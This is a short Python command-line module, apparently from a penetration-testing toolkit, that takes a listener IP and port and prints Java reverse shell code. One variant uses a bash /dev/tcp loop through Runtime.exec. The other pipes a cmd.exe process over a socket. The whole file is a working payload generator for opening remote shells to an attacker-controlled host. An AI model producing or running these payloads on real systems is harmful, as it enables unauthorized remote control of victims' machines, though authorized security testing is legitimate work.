import click
from colorama import Fore

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Print code only (no label).")
@click.option("-v", "--variant", default="1", type=click.Choice(["1", "2"]),
              help="1=Runtime.exec bash tcp (default), 2=ProcessBuilder socket loop")
def command(listener_ip, listener_port, raw, variant):
    """Return Java reverse shell code snippet"""
    if variant == "1":
        label = "Java reverse shell (Runtime.exec)"
        code = (f'Runtime r = Runtime.getRuntime();\n'
                f'Process p = r.exec("/bin/bash -c \'exec 5<>/dev/tcp/{listener_ip}/{listener_port};'
                f'cat <&5 | while read line; do $line 2>&5 >&5; done\'");\n'
                f'p.waitFor();')
    else:
        label = "Java reverse shell (ProcessBuilder socket loop)"
        code = (f'String host="{listener_ip}";\n'
                f'int port={listener_port};\n'
                f'String cmd="cmd.exe";\n'
                f'Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();'
                f'Socket s=new Socket(host,port);'
                f'InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();'
                f'OutputStream po=p.getOutputStream(),so=s.getOutputStream();'
                f'while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());'
                f'while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());'
                f'so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};'
                f'p.destroy();s.close();')
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}{label}:\n{Fore.WHITE}{code}")
    else:
        click.secho(code, nl=False)
